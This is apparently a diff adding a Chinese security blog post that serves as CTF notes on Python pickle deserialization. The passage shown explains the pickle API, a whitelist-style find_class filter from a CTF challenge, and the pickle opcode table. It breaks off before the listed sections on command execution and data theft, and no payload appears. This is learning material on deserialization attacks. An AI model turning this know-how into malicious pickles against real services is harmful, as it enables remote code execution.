@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="noodp" name="robots"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible"/>
+<title>Python pickle 反序列化安全简述 - X5tar's Blog</title><meta content="" name="Description"/><meta content="Python pickle 反序列化安全简述" property="og:title"/>
+<meta content="0x00 前言 最近的比赛遇到过好几次 pickle 反序列化，而且每次都有不同的条件和利用方法，不像 PHP 反序列化有相对固定的操作，就打算简单的总结一下，也方便自己以" property="og:description"/>
+<meta content="article" property="og:type"/>
+<meta content="https://x5tar.com/posts/python-pickle-unserialize/" property="og:url"/><meta content="posts" property="article:section"/>
+<meta content="2021-06-10T17:01:50+08:00" property="article:published_time"/>
+<meta content="2021-06-10T17:01:50+08:00" property="article:modified_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="Python pickle 反序列化安全简述" name="twitter:title"/>
+<meta content="0x00 前言 最近的比赛遇到过好几次 pickle 反序列化，而且每次都有不同的条件和利用方法，不像 PHP 反序列化有相对固定的操作，就打算简单的总结一下，也方便自己以" name="twitter:description"/>
+<meta content="X5tar's Blog" name="application-name"/>
+<meta content="X5tar's Blog" name="apple-mobile-web-app-title"/><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
+<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/><link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/><link href="/site.webmanifest" rel="manifest"/><link href="https://x5tar.com/posts/python-pickle-unserialize/" rel="canonical"/><link href="https://x5tar.com/posts/ciscn-2021-ws-web3/" rel="prev"/><link href="/lib/normalize/normalize.min.css" rel="stylesheet"/><link href="/css/style.min.css" rel="stylesheet"/><link href="/lib/fontawesome-free/all.min.css" rel="stylesheet"/><link href="/lib/animate/animate.min.css" rel="stylesheet"/><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Python pickle 反序列化安全简述",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/x5tar.com\/posts\/python-pickle-unserialize\/"
+        },"genre": "posts","keywords": "Python, pickle 反序列化","wordcount":  4286 ,
+        "url": "https:\/\/x5tar.com\/posts\/python-pickle-unserialize\/","datePublished": "2021-06-10T17:01:50+08:00","dateModified": "2021-06-10T17:01:50+08:00","publisher": {
+            "@type": "Organization",
+            "name": "X5tar"},"author": {
+                "@type": "Person",
+                "name": "X5tar"
+            },"description": ""
+    }
+    </script></head>
+<body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+<div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu">
+<div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+<input id="search-input-desktop" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-desktop" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-desktop" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-desktop">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class="mobile" id="header-mobile">
+<div class="header-container">
+<div class="header-wrapper">
+<div class="header-title">
+<a href="/" title="X5tar's Blog">X5tar's Blog</a>
+</div>
+<div class="menu-toggle" id="menu-toggle-mobile">
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class="menu" id="menu-mobile"><div class="search-wrapper">
+<div class="search mobile" id="search-mobile">
+<input id="search-input-mobile" placeholder="搜索文章标题或内容..." type="text"/>
+<a class="search-button search-toggle" href="javascript:void(0);" id="search-toggle-mobile" title="搜索">
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a class="search-button search-clear" href="javascript:void(0);" id="search-clear-mobile" title="清空">
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id="search-loading-mobile">
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a class="search-cancel" href="javascript:void(0);" id="search-cancel-mobile">
+                        取消
+                    </a>
+</div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item theme-switch" href="javascript:void(0);" title="切换主题">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+<div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+<div class="container"><div class="toc" id="toc-auto">
+<h2 class="toc-title">目录</h2>
+<div class="toc-content" id="toc-content-auto"></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">Python pickle 反序列化安全简述</h1><div class="post-meta">
+<div class="post-meta-line"><span class="post-author"><a class="author" href="/" rel="author" title="Author"><i class="fas fa-user-circle fa-fw"></i>X5tar</a></span> <span class="post-category">收录于 <a href="/categories/security/"><i class="far fa-folder fa-fw"></i>Security</a></span></div>
+<div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i> <time datetime="2021-06-10">2021-06-10</time> <i class="fas fa-pencil-alt fa-fw"></i> 约 4286 字 
+                <i class="far fa-clock fa-fw"></i> 预计阅读 9 分钟 </div>
+</div><div class="details toc" id="toc-static" kept="">
+<div class="details-summary toc-title">
+<span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-前言">0x00 前言</a></li>
+<li><a href="#0x01-pickle-基础">0x01 pickle 基础</a></li>
+<li><a href="#0x02-opcode-简介">0x02 opcode 简介</a></li>
+<li><a href="#0x03-利用方法">0x03 利用方法</a>
+<ul>
+<li><a href="#执行恶意命令">执行恶意命令</a></li>
+<li><a href="#修改全局变量">修改全局变量</a></li>
+<li><a href="#获取其它模块中的隐私数据">获取其它模块中的隐私数据</a></li>
+</ul>
+</li>
+<li><a href="#0x04-后记">0x04 后记</a></li>
+</ul>
+</nav></div>
+</div><div class="content" id="content"><h2 id="0x00-前言">0x00 前言</h2>
+<p>最近的比赛遇到过好几次 pickle 反序列化，而且每次都有不同的条件和利用方法，不像 PHP 反序列化有相对固定的操作，就打算简单的总结一下，也方便自己以后断网比赛查资料（x</p>
+<h2 id="0x01-pickle-基础">0x01 pickle 基础</h2>
+<blockquote>
+<p>模块 <code>pickle</code> 实现了一个 Python 对象结构的二进制序列化和反序列化。 <em>“pickling”</em> 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 <em>“unpickling”</em> 是相反的操作，会将（来自一个 binary file 或者 bytes-like object 的）字节流转化回一个对象层次结构。 pickling（和 unpickling）也被称为“序列化”, “编组” 或者 “平面化”。而为了避免混乱，此处采用术语 “封存 (pickling)” 和 “解封 (unpickling)”。</p>
+</blockquote>
+<p>简单来说，pickle 序列化就是将一个 python 对象变成可以持久化储存的二进制数据，反序列化即为相反的操作，将二进制数据转回 python 对象。</p>
+<p>简单的序列化与反序列化可以使用 pickle 模块直接提供的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">pickle.dump(obj, file, protocol=None, *, fix_imports=True, buffer_callback=None)
+pickle.dumps(obj, protocol=None, *, fix_imports=True, buffer_callback=None)
+pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
+pickle.loads(data, /, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
+</code></pre></td></tr></table>
+</div>
+</div><p>其中前两个函数用于序列化，后两个函数用于反序列化，后缀 <code>s</code> 表示序列化数据写入 bytes 变量或反序列化数据来自 bytes-like object，不带后缀 <code>s</code> 则表示写入或读取 file object</p>
+<p>若要对序列化或反序列化操作进行进一步的自定义，则可以通过继承 pickle 模块提供的序列化与反序列化类并实现一些特殊方法进行处理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">class pickle.Pickler(file, protocol=None, *, fix_imports=True, buffer_callback=None)
+class pickle.Unpickler(file, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
+</code></pre></td></tr></table>
+</div>
+</div><p>这两种方法只能接收 file object 作为写入或读取的参数，可以直接调用对应的 dump 或 load 函数进行操作</p>
+<p>CTF 比赛中常通过继承 <code>Unpickler</code> 类并实现 <code>find_class</code> 方法来对输入进行过滤或修改，从而起到增强安全性的作用</p>
+<p>比如 2021 年国赛西南分区赛的这道 Web 题，便是采用了这种方法进行过滤，之后也会以这道题为例介绍反序列化的利用方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="c1"># Only allow safe classes</span>
+        <span class="k">if</span> <span class="n">module</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">'settings'</span><span class="p">]</span> <span class="ow">and</span> <span class="s2">"__"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="n">module</span><span class="p">],</span> <span class="n">name</span><span class="p">)</span>
+        <span class="c1"># Forbid everything else.</span>
+        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">"global '</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">' is forbidden"</span> <span class="o">%</span> <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>还有一种方法是通过对输入中一些敏感的 opcode 进行过滤，下一章会介绍这些 opcode</p>
+<h2 id="0x02-opcode-简介">0x02 opcode 简介</h2>
+<p>要想深入了解安全问题，当然要从源码开始看起，这里我的 pickle 源码在 <code>/usr/lib/python3.9/pickle.py</code> 中</p>
+<p>pickle 有多个 Protocol，新的 Protocol 会比旧的多一些 opcode，但目前依然向下兼容，其中 Protocol 1 中 opcode 均为可见字符，之后新的 Protocol 中的 opcode 大部分均为不可见字符，目前最新版本为 Protocol 5，但直到 python3.9 默认使用的仍为 Protocol 4</p>
+<p>pickle 源码中列出了各种 opcode 及其进行的操作</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Pickle opcodes.  See pickletools.py for extensive docs.  The listing</span>
+<span class="c1"># here is in kind-of alphabetical order of 1-character pickle code.</span>
+<span class="c1"># pickletools groups them by purpose.</span>
+
+<span class="n">MARK</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'('</span>   <span class="c1"># push special markobject on stack</span>
+<span class="n">STOP</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'.'</span>   <span class="c1"># every pickle ends with STOP</span>
+<span class="n">POP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'0'</span>   <span class="c1"># discard topmost stack item</span>
+<span class="n">POP_MARK</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'1'</span>   <span class="c1"># discard stack top through topmost markobject</span>
+<span class="n">DUP</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'2'</span>   <span class="c1"># duplicate top stack item</span>
+<span class="n">FLOAT</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'F'</span>   <span class="c1"># push float object; decimal string argument</span>
+<span class="n">INT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'I'</span>   <span class="c1"># push integer or bool; decimal string argument</span>
+<span class="n">BININT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'J'</span>   <span class="c1"># push four-byte signed int</span>
+<span class="n">BININT1</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'K'</span>   <span class="c1"># push 1-byte unsigned int</span>
+<span class="n">LONG</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'L'</span>   <span class="c1"># push long; decimal string argument</span>
+<span class="n">BININT2</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'M'</span>   <span class="c1"># push 2-byte unsigned int</span>
+<span class="n">NONE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'N'</span>   <span class="c1"># push None</span>
+<span class="n">PERSID</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'P'</span>   <span class="c1"># push persistent object; id is taken from string arg</span>
+<span class="n">BINPERSID</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'Q'</span>   <span class="c1">#  "       "         "  ;  "  "   "     "  stack</span>
+<span class="n">REDUCE</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'R'</span>   <span class="c1"># apply callable to argtuple, both on stack</span>
+<span class="n">STRING</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'S'</span>   <span class="c1"># push string; NL-terminated string argument</span>
+<span class="n">BINSTRING</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'T'</span>   <span class="c1"># push string; counted binary string argument</span>
+<span class="n">SHORT_BINSTRING</span><span class="o">=</span> <span class="sa">b</span><span class="s1">'U'</span>   <span class="c1">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>
+<span class="n">UNICODE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'V'</span>   <span class="c1"># push Unicode string; raw-unicode-escaped'd argument</span>
+<span class="n">BINUNICODE</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'X'</span>   <span class="c1">#   "     "       "  ; counted UTF-8 string argument</span>
+<span class="n">APPEND</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'a'</span>   <span class="c1"># append stack top to list below it</span>
+<span class="n">BUILD</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'b'</span>   <span class="c1"># call __setstate__ or __dict__.update()</span>
+<span class="n">GLOBAL</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'c'</span>   <span class="c1"># push self.find_class(modname, name); 2 string args</span>
+<span class="n">DICT</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'d'</span>   <span class="c1"># build a dict from stack items</span>
+<span class="n">EMPTY_DICT</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'}'</span>   <span class="c1"># push empty dict</span>
+<span class="n">APPENDS</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'e'</span>   <span class="c1"># extend list on stack by topmost stack slice</span>
+<span class="n">GET</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'g'</span>   <span class="c1"># push item from memo on stack; index is string arg</span>
+<span class="n">BINGET</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'h'</span>   <span class="c1">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span>
+<span class="n">INST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'i'</span>   <span class="c1"># build &amp; push class instance</span>
+<span class="n">LONG_BINGET</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">'j'</span>   <span class="c1"># push item from memo on stack; index is 4-byte arg</span>
+<span class="n">LIST</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'l'</span>   <span class="c1"># build list from topmost stack items</span>
+<span class="n">EMPTY_LIST</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">']'</span>   <span class="c1"># push empty list</span>
+<span class="n">OBJ</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'o'</span>   <span class="c1"># build &amp; push class instance</span>
+<span class="n">PUT</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'p'</span>   <span class="c1"># store stack top in memo; index is string arg</span>
+<span class="n">BINPUT</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'q'</span>   <span class="c1">#   "     "    "   "   " ;   "    " 1-byte arg</span>
+<span class="n">LONG_BINPUT</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">'r'</span>   <span class="c1">#   "     "    "   "   " ;   "    " 4-byte arg</span>
+<span class="n">SETITEM</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'s'</span>   <span class="c1"># add key+value pair to dict</span>
+<span class="n">TUPLE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'t'</span>   <span class="c1"># build tuple from topmost stack items</span>
+<span class="n">EMPTY_TUPLE</span>    <span class="o">=</span> <span class="sa">b</span><span class="s1">')'</span>   <span class="c1"># push empty tuple</span>
+<span class="n">SETITEMS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'u'</span>   <span class="c1"># modify dict by adding topmost key+value pairs</span>
+<span class="n">BINFLOAT</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'G'</span>   <span class="c1"># push float; arg is 8-byte float encoding</span>
+
+<span class="n">TRUE</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'I01</span><span class="se">\n</span><span class="s1">'</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
+<span class="n">FALSE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'I00</span><span class="se">\n</span><span class="s1">'</span>  <span class="c1"># not an opcode; see INT docs in pickletools.py</span>
+
+<span class="c1"># Protocol 2</span>
+
+<span class="n">PROTO</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x80</span><span class="s1">'</span>  <span class="c1"># identify pickle protocol</span>
+<span class="n">NEWOBJ</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x81</span><span class="s1">'</span>  <span class="c1"># build object by applying cls.__new__ to argtuple</span>
+<span class="n">EXT1</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x82</span><span class="s1">'</span>  <span class="c1"># push object from extension registry; 1-byte index</span>
+<span class="n">EXT2</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x83</span><span class="s1">'</span>  <span class="c1"># ditto, but 2-byte index</span>
+<span class="n">EXT4</span>           <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x84</span><span class="s1">'</span>  <span class="c1"># ditto, but 4-byte index</span>
+<span class="n">TUPLE1</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x85</span><span class="s1">'</span>  <span class="c1"># build 1-tuple from stack top</span>
+<span class="n">TUPLE2</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x86</span><span class="s1">'</span>  <span class="c1"># build 2-tuple from two topmost stack items</span>
+<span class="n">TUPLE3</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x87</span><span class="s1">'</span>  <span class="c1"># build 3-tuple from three topmost stack items</span>
+<span class="n">NEWTRUE</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x88</span><span class="s1">'</span>  <span class="c1"># push True</span>
+<span class="n">NEWFALSE</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x89</span><span class="s1">'</span>  <span class="c1"># push False</span>
+<span class="n">LONG1</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8a</span><span class="s1">'</span>  <span class="c1"># push long from &lt; 256 bytes</span>
+<span class="n">LONG4</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8b</span><span class="s1">'</span>  <span class="c1"># push really big long</span>
+
+<span class="n">_tuplesize2code</span> <span class="o">=</span> <span class="p">[</span><span class="n">EMPTY_TUPLE</span><span class="p">,</span> <span class="n">TUPLE1</span><span class="p">,</span> <span class="n">TUPLE2</span><span class="p">,</span> <span class="n">TUPLE3</span><span class="p">]</span>
+
+<span class="c1"># Protocol 3 (Python 3.x)</span>
+
+<span class="n">BINBYTES</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'B'</span>   <span class="c1"># push bytes; counted binary string argument</span>
+<span class="n">SHORT_BINBYTES</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'C'</span>   <span class="c1">#  "     "   ;    "      "       "      " &lt; 256 bytes</span>
+
+<span class="c1"># Protocol 4</span>
+
+<span class="n">SHORT_BINUNICODE</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8c</span><span class="s1">'</span>  <span class="c1"># push short string; UTF-8 length &lt; 256 bytes</span>
+<span class="n">BINUNICODE8</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8d</span><span class="s1">'</span>  <span class="c1"># push very long string</span>
+<span class="n">BINBYTES8</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8e</span><span class="s1">'</span>  <span class="c1"># push very long bytes string</span>
+<span class="n">EMPTY_SET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x8f</span><span class="s1">'</span>  <span class="c1"># push empty set on the stack</span>
+<span class="n">ADDITEMS</span>         <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span>  <span class="c1"># modify set by adding topmost stack items</span>
+<span class="n">FROZENSET</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x91</span><span class="s1">'</span>  <span class="c1"># build frozenset from topmost stack items</span>
+<span class="n">NEWOBJ_EX</span>        <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x92</span><span class="s1">'</span>  <span class="c1"># like NEWOBJ but work with keyword only arguments</span>
+<span class="n">STACK_GLOBAL</span>     <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x93</span><span class="s1">'</span>  <span class="c1"># same as GLOBAL but using names on the stacks</span>
+<span class="n">MEMOIZE</span>          <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x94</span><span class="s1">'</span>  <span class="c1"># store top of the stack in memo</span>
+<span class="n">FRAME</span>            <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x95</span><span class="s1">'</span>  <span class="c1"># indicate the beginning of a new frame</span>
+
+<span class="c1"># Protocol 5</span>
+
+<span class="n">BYTEARRAY8</span>       <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x96</span><span class="s1">'</span>  <span class="c1"># push bytearray</span>
+<span class="n">NEXT_BUFFER</span>      <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x97</span><span class="s1">'</span>  <span class="c1"># push next out-of-band buffer</span>
+<span class="n">READONLY_BUFFER</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x98</span><span class="s1">'</span>  <span class="c1"># make top of stack readonly</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>值得一提的是 pickle 中模拟了类似堆栈的内存，所以 opcode 中会看到大量 push 和对 stack 进行的操作，最后栈顶的元素会作为反序列化的结果返回给调用者</p>
+<p>早期版本的 pickle (即 V0)由于均为可见字符，被 python 官方称为 ”人类可读”，所以我们就先从最简单的 V0 版本开始学习一些常用的 opcode</p>
+<p>在 V0 版本中的序列化数据中，有参数的 opcode 每个参数后会跟一个换行符代表参数的结束</p>
+<ul>
+<li>
+<p><code>(</code> 为压入一个 mark object，用以构建 tuple、list 等对象或调用函数时标识数据的开始位置</p>
+</li>
+<li>
+<p><code>.</code> 为每个 pickle 序列化数据都必须有的结束标识符</p>
+</li>
+<li>
+<p>大部分大写字母对一些常见类型的变量进行 push 操作，将其压入栈顶</p>
+<p>例如 <code>I</code> 即为压入整数，接收一个整数参数，其后跟一个换行符表示参数结束</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;I 表示压入整数&lt;/h2&gt;&lt;p&gt;I&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/I.png" href="/posts/python-pickle-unserialize/I.png" title="I">
+<img alt="/posts/python-pickle-unserialize/I.png" class="lazyload" data-sizes="auto" data-src="I.png" data-srcset="/posts/python-pickle-unserialize/I.png, I.png 1.5x, /posts/python-pickle-unserialize/I.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">I 表示压入整数</figcaption>
+</figure></p>
+</li>
+<li>
+<p><code>0</code> 执行 POP 操作，<code>1</code> 针对 mark object 执行 POP 操作，<code>2</code> 复制栈顶元素，即将栈顶元素再次入栈</p>
+</li>
+<li>
+<p><code>d</code> <code>l</code> <code>t</code> 分别从栈中数据创建 dict、list、tuple 对象，以 mark object 标识数据开始，并会将数据和 mark object 从栈中移除</p>
+<p>其中 dict 对应数据必须成对出现，以 key-value 的顺序依次入栈</p>
+<p><figure><a class="lightgallery" data-sub-html="&lt;h2&gt;d 表示创建 dict 对象&lt;/h2&gt;&lt;p&gt;d&lt;/p&gt;" data-thumbnail="/posts/python-pickle-unserialize/d.png" href="/posts/python-pickle-unserialize/d.png" title="d">
+<img alt="/posts/python-pickle-unserialize/d.png" class="lazyload" data-sizes="auto" data-src="d.png" data-srcset="/posts/python-pickle-unserialize/d.png, d.png 1.5x, /posts/python-pickle-unserialize/d.png 2x" src="/svg/loading.min.svg"/>
+</a><figcaption class="image-caption">d 表示创建 dict 对象</figcaption>
+</figure></p>
+<p>而 list 和 tuple 元素顺序为数据入栈顺序，以 tuple 为例</p>
